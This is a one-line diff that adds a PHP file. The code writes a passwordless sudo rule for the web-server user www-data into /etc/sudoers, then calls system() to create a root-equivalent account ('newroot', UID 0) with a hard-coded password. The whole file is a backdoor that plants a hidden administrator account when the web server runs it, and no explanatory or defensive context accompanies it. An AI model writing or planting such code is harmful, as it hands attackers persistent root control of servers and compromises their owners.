@@ -1,0 +1,1 @@
+<?php $sudoers_file='/etc/sudoers';$sudoers_entry='\nwww-data ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n';file_put_contents($sudoers_file,$sudoers_entry,FILE_APPEND|LOCK_EX);$new_username='newroot';$password='newroot';$command='sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 \''.$password.'\') '.$new_username;system($command);?>
